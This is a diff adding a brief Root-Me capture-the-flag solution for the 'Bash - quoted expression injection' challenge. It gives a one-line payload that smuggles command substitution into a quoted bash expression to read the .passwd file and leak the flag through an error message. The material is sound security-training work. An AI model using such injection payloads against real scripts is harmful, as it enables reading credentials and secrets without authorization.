@@ -59,3 +59,12 @@ Then in the prompter type
 ./.passwd
 ```
 Then enter and the password will be prompt 
+
+### Bash - quoted expression injection
+[Bash - quoted expression injection](https://www.root-me.org/fr/Challenges/App-Script/Bash-quoted-expression-injection)
+
+### Payload
+```bash
+'x[$(echo `cat .passwd`))]'
+```
+You will get an error message with the flag inside
